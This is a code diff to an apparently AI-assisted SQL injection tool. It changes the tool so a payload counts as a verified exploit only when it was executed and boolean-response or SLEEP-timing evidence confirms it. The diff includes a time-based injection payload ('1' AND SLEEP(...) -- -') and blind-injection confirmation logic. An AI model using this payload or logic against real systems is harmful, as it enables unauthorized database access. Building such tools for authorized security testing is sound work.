@@ -657,68 +657,77 @@ class WebBackend:
         true_payload = self._get_step_query_param(true_step, param) if true_step else None
         candidate_payload = self._get_step_query_param(candidate_step, param)
         current_payload = self._get_step_query_param(current_step, param) if current_step else None
-        repaired_payload = state.get("verified_exploit_payload")
-
         def clean(p: Optional[str]) -> Optional[str]:
             if not p:
                 return None
             return unquote_plus(str(p)).strip()
 
-        repaired_payload = clean(repaired_payload)
-        current_payload = clean(current_payload)
-        candidate_payload = clean(candidate_payload)
-        true_payload = clean(true_payload)
+        executed = state.get("executed_payloads") or {}
 
-        if self._candidate_is_usable(current_payload):
-            state["verified"] = True
-            state["verified_exploit_payload"] = current_payload
-            state["final_payload"] = current_payload
-            state["final_payload_source"] = "current_step"
-            if state.get("strategy_used") not in ("KEEP_CANDIDATE", "KEEP_REPAIRED"):
-                state["strategy_used"] = "KEEP_CURRENT"
-            return state
+        def executed_payload(step_id):
+            if not step_id or step_id not in executed:
+                return None
+            configured = clean(self._get_step_query_param(step_id, param))
+            actual = clean(executed[step_id])
+            return configured if configured and configured == actual else None
 
-        if self._candidate_is_usable(repaired_payload) and self._prefer_same_intent_repair(candidate_payload, repaired_payload):
-            state["verified"] = True
-            state["verified_exploit_payload"] = repaired_payload
-            state["final_payload"] = repaired_payload
-            state["final_payload_source"] = "repaired_payload"
-            if state.get("strategy_used") not in ("KEEP_CANDIDATE", "KEEP_CURRENT"):
-                state["strategy_used"] = "KEEP_REPAIRED"
-            return state
+        # Boolean evidence identifies the successful true-step payload.
+        fps = state.get("response_fingerprints") or {}
+        baseline_step = bd.get("baseline_step")
+        true_payload = executed_payload(true_step)
 
-        if self._candidate_is_usable(candidate_payload):
-            state["verified"] = True
-            state["verified_exploit_payload"] = candidate_payload
-            state["final_payload"] = candidate_payload
-            state["final_payload_source"] = "candidate_step"
-            state["strategy_used"] = "KEEP_CANDIDATE"
-            return state
-
-        if current_step == false_step and self._candidate_is_usable(true_payload):
-            state["verified"] = True
-            state["verified_exploit_payload"] = true_payload
-            state["final_payload"] = true_payload
-            state["final_payload_source"] = "true_step"
-            state["strategy_used"] = "BOOLEAN_VERIFIED"
-            return state
-
-        if self._candidate_is_usable(true_payload):
-            state["verified"] = True
-            state["verified_exploit_payload"] = true_payload
-            state["final_payload"] = true_payload
-            state["final_payload_source"] = "true_step"
-            state["strategy_used"] = "BOOLEAN_VERIFIED"
-            return state
-
-        fallback = self._to_true_payload(
-            current_payload or repaired_payload or candidate_payload or true_payload
+        boolean_confirmed = (
+            baseline_step
+            and true_step
+            and false_step
+            and fps.get(baseline_step) is not None
+            and fps.get(true_step) == fps.get(baseline_step)
+            and fps.get(false_step) is not None
+            and fps.get(false_step) != fps.get(baseline_step)
         )
-        state["verified"] = True
-        state["verified_exploit_payload"] = fallback
-        state["final_payload"] = fallback
-        state["final_payload_source"] = "fallback"
-        state["strategy_used"] = "BOOLEAN_FALLBACK"
+
+        if boolean_confirmed and self._candidate_is_usable(true_payload):
+            state["verified"] = True
+            state["verified_exploit_payload"] = true_payload
+            state["final_payload"] = true_payload
+            state["final_payload_source"] = "true_step"
+            state["strategy_used"] = "BOOLEAN_VERIFIED"
+            return state
+
+        # Timing evidence must identify the executed probe, not
+        # an unrelated candidate or the latest observed step.
+        td = success.get("time_diff") or {}
+        probe_step = td.get("probe_step") or state.get("time_probe_step_id")
+        probe_payload = executed_payload(probe_step)
+        elapsed = state.get("step_elapsed") or {}
+        baseline_time = float(elapsed.get(td.get("baseline_step"), 0) or 0)
+        probe_time = float(elapsed.get(probe_step, 0) or 0)
+        min_delta = float(td.get("min_delta_s", 3.0))
+        confirmations = int(state.get("time_probe_confirmations", 0))
+
+        timing_confirmed = (
+            baseline_time > 0
+            and probe_time > 0
+            and probe_time - baseline_time >= min_delta
+            and (
+                not state.get("time_probe_active")
+                or confirmations >= 1
+            )
+        )
+
+        if timing_confirmed and self._candidate_is_usable(probe_payload):
+            state["verified"] = True
+            state["verified_exploit_payload"] = probe_payload
+            state["final_payload"] = probe_payload
+            state["final_payload_source"] = "probe_step"
+            state["strategy_used"] = "TIME_VERIFIED"
+            return state
+
+        # Execution without matching success evidence is insufficient.
+        state["verified"] = False
+        state.pop("verified_exploit_payload", None)
+        state.pop("final_payload", None)
+        state["final_payload_source"] = "none"
         return state
 
     # ---------------------------
@@ -755,6 +764,10 @@ class WebBackend:
         step = steps[idx]
         step_id = step.get("id", f"step_{idx}")
         step_name = step.get("name", step_id)
+
+        # Capture the payload associated with this request.
+        param = (self.spec.get("adexa_cli") or {}).get("param", "id")
+        executed_payload = self._get_step_query_param(step_id, param)
 
         method = (step.get("method") or "GET").upper()
         path = step.get("path") or "/"
@@ -823,6 +836,7 @@ class WebBackend:
 
         fp = _sha16(signal_text)
         state["response_fingerprints"][step_id] = fp
+        state.setdefault("executed_payloads", {})[step_id] = executed_payload
         state.setdefault("debug_fps", {})
         state["debug_fps"][step_id] = fp
         state["step_elapsed"][step_id] = elapsed
@@ -894,6 +908,7 @@ class WebBackend:
                 "web": {
                     "step_id": step_id,
                     "step_name": step_name,
+                    "executed_payload": executed_payload,
                     "method": method,
                     "path": path,
                     "url": url,
@@ -1051,7 +1066,7 @@ class WebBackend:
                     next_strategy = "SWITCH_BOOLEAN"
 
                 state["strategy_used"] = next_strategy
-                state["verified_exploit_payload"] = next_payload
+                state["proposed_payload"] = next_payload
                 state["ai_reason"] = explanation or "AI repair selected"
                 state["used_memory_case"] = analysis.get("used_memory_case")
                 state["memory_match_reason"] = analysis.get("memory_match_reason")
@@ -1105,7 +1120,7 @@ class WebBackend:
                 next_strategy = "SWITCH_BOOLEAN"
 
             state["strategy_used"] = next_strategy
-            state["verified_exploit_payload"] = next_payload
+            state["proposed_payload"] = next_payload
             state["ai_reason"] = explanation or "AI repair selected"
             state["used_memory_case"] = analysis.get("used_memory_case")
             state["memory_match_reason"] = analysis.get("memory_match_reason")
@@ -1161,7 +1176,7 @@ class WebBackend:
 
                 bd = (self.spec.get("success") or {}).get("boolean_diff") or {}
                 state["time_probe_baseline_step"] = bd.get("baseline_step", "sqli_baseline")
-                state["verified_exploit_payload"] = next_payload
+                state["proposed_payload"] = next_payload
                 state["ai_reason"] = explanation or "AI repair selected"
                 state["used_memory_case"] = analysis.get("used_memory_case")
                 state["memory_match_reason"] = analysis.get("memory_match_reason")
@@ -1193,7 +1208,7 @@ class WebBackend:
 
             if next_strategy == "SWITCH_BOOLEAN":
                 state["strategy_used"] = "SWITCH_BOOLEAN"
-                state["verified_exploit_payload"] = next_payload
+                state["proposed_payload"] = next_payload
                 state["ai_reason"] = explanation or "AI repair selected"
                 state["used_memory_case"] = analysis.get("used_memory_case")
                 state["memory_match_reason"] = analysis.get("memory_match_reason")
@@ -1257,7 +1272,7 @@ class WebBackend:
                 payload = f"1' AND SLEEP({sleep_s}) -- -"
 
                 state["strategy_used"] = "TIME_PROBE_RETRY"
-                state["verified_exploit_payload"] = payload
+                state["proposed_payload"] = payload
                 state["ai_reason"] = f"Retrying time probe with SLEEP({sleep_s})."
 
                 return PatchPlan(
@@ -1322,7 +1337,27 @@ class WebBackend:
                 for s in steps:
                     if s.get("id") == target_step:
                         old_path = s.get("path") or ""
-                        s["path"] = _update_query_param_in_path(old_path, param, str(new_value))
+                        new_path = _update_query_param_in_path(
+                            old_path, param, str(new_value)
+                        )
+
+                        if new_path != old_path:
+                            state.get("executed_payloads", {}).pop(target_step, None)
+                            state.get("response_fingerprints", {}).pop(target_step, None)
+                            state.get("step_elapsed", {}).pop(target_step, None)
+
+                            configured_probe = (
+                                (self.spec.get("success") or {})
+                                .get("time_diff", {})
+                                .get("probe_step")
+                            )
+                            if target_step in (
+                                state.get("time_probe_step_id"),
+                                configured_probe,
+                            ):
+                                state["time_probe_confirmations"] = 0
+
+                        s["path"] = new_path
                         break
 
         state["last_plan"] = {
